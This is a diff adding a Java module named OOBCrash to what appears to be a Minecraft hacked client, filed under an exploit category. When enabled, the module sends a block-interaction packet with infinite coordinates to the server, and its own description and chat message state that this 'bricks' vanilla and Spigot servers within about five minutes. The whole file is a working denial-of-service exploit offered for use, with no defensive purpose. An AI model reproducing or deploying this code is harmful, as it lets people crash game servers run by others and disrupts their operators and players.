@@ -1,0 +1,57 @@
+/*
+ * This file is part of the atomic client distribution.
+ * Copyright (c) 2021-2021 0x150.
+ */
+
+package me.x150.sipprivate.feature.module.impl;
+
+import me.x150.sipprivate.SipoverPrivate;
+import me.x150.sipprivate.feature.module.Module;
+import me.x150.sipprivate.feature.module.ModuleType;
+import me.x150.sipprivate.util.Utils;
+import net.minecraft.client.util.math.MatrixStack;
+import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
+import net.minecraft.util.Hand;
+import net.minecraft.util.hit.BlockHitResult;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
+import net.minecraft.util.math.Vec3d;
+
+import java.util.Objects;
+
+public class OOBCrash extends Module {
+
+    public OOBCrash() {
+        super("OOBCrash", "Bricks the server after doing the funny. Vanilla and spigot only", ModuleType.EXPLOIT);
+    }
+
+    @Override public void tick() {
+
+    }
+
+    @Override public void enable() {
+        BlockHitResult bhr = new BlockHitResult(Objects.requireNonNull(SipoverPrivate.client.player)
+                .getPos(), Direction.DOWN, new BlockPos(new Vec3d(Double.POSITIVE_INFINITY, 5, Double.POSITIVE_INFINITY)), false);
+        PlayerInteractBlockC2SPacket p = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
+        Objects.requireNonNull(SipoverPrivate.client.getNetworkHandler()).sendPacket(p);
+        Utils.Logging.messageChat("Wait a bit for this to complete, the server will run fine again for about 5 minutes. After that, it will just brick itself.");
+        setEnabled(false);
+    }
+
+    @Override public void disable() {
+
+    }
+
+    @Override public String getContext() {
+        return null;
+    }
+
+    @Override public void onWorldRender(MatrixStack matrices) {
+
+    }
+
+    @Override public void onHudRender() {
+
+    }
+}
+
